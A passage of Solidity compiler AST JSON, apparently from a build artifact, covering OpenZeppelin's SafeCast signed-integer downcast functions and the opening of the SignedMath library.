int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5316,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"32474:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int32_$","typeString":"type(int32)"},"typeName":{"id":5315,"name":"int32","nodeType":"ElementaryTypeName","src":"32474:5:7","typeDescriptions":{}}},"id":5318,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"32474:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int32","typeString":"int32"}},"src":"32461:25:7","typeDescriptions":{"typeIdentifier":"t_int32","typeString":"int32"}},"id":5320,"nodeType":"ExpressionStatement","src":"32461:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5323,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5321,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5312,"src":"32500:10:7","typeDescriptions":{"typeIdentifier":"t_int32","typeString":"int32"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5322,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5309,"src":"32514:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"32500:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5330,"nodeType":"IfStatement","src":"32496:97:7","trueBody":{"id":5329,"nodeType":"Block","src":"32521:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3332","id":5325,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"32572:2:7","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},{"id":5326,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5309,"src":"32576:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5324,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"32542:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5327,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"32542:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5328,"nodeType":"RevertStatement","src":"32535:47:7"}]}}]},"documentation":{"id":5307,"nodeType":"StructuredDocumentation","src":"32067:307:7","text":" @dev Returns the downcasted int32 from int256, reverting on\n overflow (when the input is less than smallest int32 or\n greater than largest int32).\n Counterpart to Solidity's `int32` operator.\n Requirements:\n - input must fit into 32 bits"},"id":5332,"implemented":true,"kind":"function","modifiers":[],"name":"toInt32","nameLocation":"32388:7:7","nodeType":"FunctionDefinition","parameters":{"id":5310,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5309,"mutability":"mutable","name":"value","nameLocation":"32403:5:7","nodeType":"VariableDeclaration","scope":5332,"src":"32396:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5308,"name":"int256","nodeType":"ElementaryTypeName","src":"32396:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"32395:14:7"},"returnParameters":{"id":5313,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5312,"mutability":"mutable","name":"downcasted","nameLocation":"32439:10:7","nodeType":"VariableDeclaration","scope":5332,"src":"32433:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int32","typeString":"int32"},"typeName":{"id":5311,"name":"int32","nodeType":"ElementaryTypeName","src":"32433:5:7","typeDescriptions":{"typeIdentifier":"t_int32","typeString":"int32"}},"visibility":"internal"}],"src":"32432:18:7"},"scope":5451,"src":"32379:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5357,"nodeType":"Block","src":"32989:148:7","statements":[{"expression":{"id":5345,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5340,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5338,"src":"32999:10:7","typeDescriptions":{"typeIdentifier":"t_int24","typeString":"int24"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5343,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5335,"src":"33018:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5342,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"33012:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int24_$","typeString":"type(int24)"},"typeName":{"id":5341,"name":"int24","nodeType":"ElementaryTypeName","src":"33012:5:7","typeDescriptions":{}}},"id":5344,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"33012:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int24","typeString":"int24"}},"src":"32999:25:7","typeDescriptions":{"typeIdentifier":"t_int24","typeString":"int24"}},"id":5346,"nodeType":"ExpressionStatement","src":"32999:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5349,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5347,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5338,"src":"33038:10:7","typeDescriptions":{"typeIdentifier":"t_int24","typeString":"int24"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5348,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5335,"src":"33052:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"33038:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5356,"nodeType":"IfStatement","src":"33034:97:7","trueBody":{"id":5355,"nodeType":"Block","src":"33059:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3234","id":5351,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"33110:2:7","typeDescriptions":{"typeIdentifier":"t_rational_24_by_1","typeString":"int_const 24"},"value":"24"},{"id":5352,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5335,"src":"33114:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_24_by_1","typeString":"int_const 24"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5350,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"33080:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5353,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"33080:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5354,"nodeType":"RevertStatement","src":"33073:47:7"}]}}]},"documentation":{"id":5333,"nodeType":"StructuredDocumentation","src":"32605:307:7","text":" @dev Returns the downcasted int24 from int256, reverting on\n overflow (when the input is less than smallest int24 or\n greater than largest int24).\n Counterpart to Solidity's `int24` operator.\n Requirements:\n - input must fit into 24 bits"},"id":5358,"implemented":true,"kind":"function","modifiers":[],"name":"toInt24","nameLocation":"32926:7:7","nodeType":"FunctionDefinition","parameters":{"id":5336,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5335,"mutability":"mutable","name":"value","nameLocation":"32941:5:7","nodeType":"VariableDeclaration","scope":5358,"src":"32934:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5334,"name":"int256","nodeType":"ElementaryTypeName","src":"32934:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"32933:14:7"},"returnParameters":{"id":5339,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5338,"mutability":"mutable","name":"downcasted","nameLocation":"32977:10:7","nodeType":"VariableDeclaration","scope":5358,"src":"32971:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int24","typeString":"int24"},"typeName":{"id":5337,"name":"int24","nodeType":"ElementaryTypeName","src":"32971:5:7","typeDescriptions":{"typeIdentifier":"t_int24","typeString":"int24"}},"visibility":"internal"}],"src":"32970:18:7"},"scope":5451,"src":"32917:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5383,"nodeType":"Block","src":"33527:148:7","statements":[{"expression":{"id":5371,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5366,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5364,"src":"33537:10:7","typeDescriptions":{"typeIdentifier":"t_int16","typeString":"int16"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5369,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5361,"src":"33556:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5368,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"33550:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int16_$","typeString":"type(int16)"},"typeName":{"id":5367,"name":"int16","nodeType":"ElementaryTypeName","src":"33550:5:7","typeDescriptions":{}}},"id":5370,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"33550:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int16","typeString":"int16"}},"src":"33537:25:7","typeDescriptions":{"typeIdentifier":"t_int16","typeString":"int16"}},"id":5372,"nodeType":"ExpressionStatement","src":"33537:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5375,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5373,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5364,"src":"33576:10:7","typeDescriptions":{"typeIdentifier":"t_int16","typeString":"int16"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5374,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5361,"src":"33590:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"33576:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5382,"nodeType":"IfStatement","src":"33572:97:7","trueBody":{"id":5381,"nodeType":"Block","src":"33597:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3136","id":5377,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"33648:2:7","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},{"id":5378,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5361,"src":"33652:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5376,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"33618:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5379,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"33618:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5380,"nodeType":"RevertStatement","src":"33611:47:7"}]}}]},"documentation":{"id":5359,"nodeType":"StructuredDocumentation","src":"33143:307:7","text":" @dev Returns the downcasted int16 from int256, reverting on\n overflow (when the input is less than smallest int16 or\n greater than largest int16).\n Counterpart to Solidity's `int16` operator.\n Requirements:\n - input must fit into 16 bits"},"id":5384,"implemented":true,"kind":"function","modifiers":[],"name":"toInt16","nameLocation":"33464:7:7","nodeType":"FunctionDefinition","parameters":{"id":5362,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5361,"mutability":"mutable","name":"value","nameLocation":"33479:5:7","nodeType":"VariableDeclaration","scope":5384,"src":"33472:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5360,"name":"int256","nodeType":"ElementaryTypeName","src":"33472:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"33471:14:7"},"returnParameters":{"id":5365,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5364,"mutability":"mutable","name":"downcasted","nameLocation":"33515:10:7","nodeType":"VariableDeclaration","scope":5384,"src":"33509:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int16","typeString":"int16"},"typeName":{"id":5363,"name":"int16","nodeType":"ElementaryTypeName","src":"33509:5:7","typeDescriptions":{"typeIdentifier":"t_int16","typeString":"int16"}},"visibility":"internal"}],"src":"33508:18:7"},"scope":5451,"src":"33455:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5409,"nodeType":"Block","src":"34058:146:7","statements":[{"expression":{"id":5397,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5392,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5390,"src":"34068:10:7","typeDescriptions":{"typeIdentifier":"t_int8","typeString":"int8"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5395,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5387,"src":"34086:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5394,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"34081:4:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int8_$","typeString":"type(int8)"},"typeName":{"id":5393,"name":"int8","nodeType":"ElementaryTypeName","src":"34081:4:7","typeDescriptions":{}}},"id":5396,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"34081:11:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int8","typeString":"int8"}},"src":"34068:24:7","typeDescriptions":{"typeIdentifier":"t_int8","typeString":"int8"}},"id":5398,"nodeType":"ExpressionStatement","src":"34068:24:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5401,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5399,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5390,"src":"34106:10:7","typeDescriptions":{"typeIdentifier":"t_int8","typeString":"int8"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5400,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5387,"src":"34120:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"34106:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5408,"nodeType":"IfStatement","src":"34102:96:7","trueBody":{"id":5407,"nodeType":"Block","src":"34127:71:7","statements":[{"errorCall":{"arguments":[{"hexValue":"38","id":5403,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"34178:1:7","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},{"id":5404,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5387,"src":"34181:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5402,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"34148:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5405,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"34148:39:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5406,"nodeType":"RevertStatement","src":"34141:46:7"}]}}]},"documentation":{"id":5385,"nodeType":"StructuredDocumentation","src":"33681:302:7","text":" @dev Returns the downcasted int8 from int256, reverting on\n overflow (when the input is less than smallest int8 or\n greater than largest int8).\n Counterpart to Solidity's `int8` operator.\n Requirements:\n - input must fit into 8 bits"},"id":5410,"implemented":true,"kind":"function","modifiers":[],"name":"toInt8","nameLocation":"33997:6:7","nodeType":"FunctionDefinition","parameters":{"id":5388,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5387,"mutability":"mutable","name":"value","nameLocation":"34011:5:7","nodeType":"VariableDeclaration","scope":5410,"src":"34004:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5386,"name":"int256","nodeType":"ElementaryTypeName","src":"34004:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"34003:14:7"},"returnParameters":{"id":5391,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5390,"mutability":"mutable","name":"downcasted","nameLocation":"34046:10:7","nodeType":"VariableDeclaration","scope":5410,"src":"34041:15:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int8","typeString":"int8"},"typeName":{"id":5389,"name":"int8","nodeType":"ElementaryTypeName","src":"34041:4:7","typeDescriptions":{"typeIdentifier":"t_int8","typeString":"int8"}},"visibility":"internal"}],"src":"34040:17:7"},"scope":5451,"src":"33988:216:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5439,"nodeType":"Block","src":"34444:250:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":5427,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5418,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5413,"src":"34557:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"arguments":[{"expression":{"arguments":[{"id":5423,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"34578:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":5422,"name":"int256","nodeType":"ElementaryTypeName","src":"34578:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"}],"id":5421,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"34573:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":5424,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"34573:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_int256","typeString":"type(int256)"}},"id":5425,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"34586:3:7","memberName":"max","nodeType":"MemberAccess","src":"34573:16:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5420,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"34565:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":5419,"name":"uint256","nodeType":"ElementaryTypeName","src":"34565:7:7","typeDescriptions":{}}},"id":5426,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"34565:25:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"34557:33:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5433,"nodeType":"IfStatement","src":"34553:105:7","trueBody":{"id":5432,"nodeType":"Block","src":"34592:66:7","statements":[{"errorCall":{"arguments":[{"id":5429,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5413,"src":"34641:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":5428,"name":"SafeCastOverflowedUintToInt","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3713,"src":"34613:27:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint256_$returns$_t_error_$","typeString":"function (uint256) pure returns (error)"}},"id":5430,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"34613:34:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5431,"nodeType":"RevertStatement","src":"34606:41:7"}]}},{"expression":{"arguments":[{"id":5436,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5413,"src":"34681:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":5435,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"34674:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":5434,"name":"int256","nodeType":"ElementaryTypeName","src":"34674:6:7","typeDescriptions":{}}},"id":5437,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"34674:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":5417,"id":5438,"nodeType":"Return","src":"34667:20:7"}]},"documentation":{"id":5411,"nodeType":"StructuredDocumentation","src":"34210:165:7","text":" @dev Converts an unsigned uint256 into a signed int256.\n Requirements:\n - input must be less than or equal to maxInt256."},"id":5440,"implemented":true,"kind":"function","modifiers":[],"name":"toInt256","nameLocation":"34389:8:7","nodeType":"FunctionDefinition","parameters":{"id":5414,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5413,"mutability":"mutable","name":"value","nameLocation":"34406:5:7","nodeType":"VariableDeclaration","scope":5440,"src":"34398:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5412,"name":"uint256","nodeType":"ElementaryTypeName","src":"34398:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"34397:15:7"},"returnParameters":{"id":5417,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5416,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5440,"src":"34436:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5415,"name":"int256","nodeType":"ElementaryTypeName","src":"34436:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"34435:8:7"},"scope":5451,"src":"34380:314:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5449,"nodeType":"Block","src":"34853:87:7","statements":[{"AST":{"nativeSrc":"34888:46:7","nodeType":"YulBlock","src":"34888:46:7","statements":[{"nativeSrc":"34902:22:7","nodeType":"YulAssignment","src":"34902:22:7","value":{"arguments":[{"arguments":[{"name":"b","nativeSrc":"34921:1:7","nodeType":"YulIdentifier","src":"34921:1:7"}],"functionName":{"name":"iszero","nativeSrc":"34914:6:7","nodeType":"YulIdentifier","src":"34914:6:7"},"nativeSrc":"34914:9:7","nodeType":"YulFunctionCall","src":"34914:9:7"}],"functionName":{"name":"iszero","nativeSrc":"34907:6:7","nodeType":"YulIdentifier","src":"34907:6:7"},"nativeSrc":"34907:17:7","nodeType":"YulFunctionCall","src":"34907:17:7"},"variableNames":[{"name":"u","nativeSrc":"34902:1:7","nodeType":"YulIdentifier","src":"34902:1:7"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":5443,"isOffset":false,"isSlot":false,"src":"34921:1:7","valueSize":1},{"declaration":5446,"isOffset":false,"isSlot":false,"src":"34902:1:7","valueSize":1}],"flags":["memory-safe"],"id":5448,"nodeType":"InlineAssembly","src":"34863:71:7"}]},"documentation":{"id":5441,"nodeType":"StructuredDocumentation","src":"34700:90:7","text":" @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump."},"id":5450,"implemented":true,"kind":"function","modifiers":[],"name":"toUint","nameLocation":"34804:6:7","nodeType":"FunctionDefinition","parameters":{"id":5444,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5443,"mutability":"mutable","name":"b","nameLocation":"34816:1:7","nodeType":"VariableDeclaration","scope":5450,"src":"34811:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":5442,"name":"bool","nodeType":"ElementaryTypeName","src":"34811:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"34810:8:7"},"returnParameters":{"id":5447,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5446,"mutability":"mutable","name":"u","nameLocation":"34850:1:7","nodeType":"VariableDeclaration","scope":5450,"src":"34842:9:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5445,"name":"uint256","nodeType":"ElementaryTypeName","src":"34842:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"34841:11:7"},"scope":5451,"src":"34795:145:7","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":5452,"src":"769:34173:7","usedErrors":[3696,3701,3708,3713],"usedEvents":[]}],"src":"192:34751:7"},"id":7},"@openzeppelin/contracts/utils/math/SignedMath.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/math/SignedMath.sol","exportedSymbols":{"SafeCast":[5451],"SignedMath":[5595]},"id":5596,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":5453,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"109:24:8"},{"absolutePath":"@openzeppelin/contracts/utils/math/SafeCast.sol","file":"./SafeCast.sol","id":5455,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":5596,"sourceUnit":5452,"src":"135:40:8","symbolAliases":[{"foreign":{"id":5454,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"143:8:8","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[],"canonicalName":"SignedMath","contractDependencies":[],"contractKind":"library","documentation":{"id":5456,"nodeType":"StructuredDocumentation","src":"177:80:8","text":" @dev Standard signed math utilities missing in the Solidity 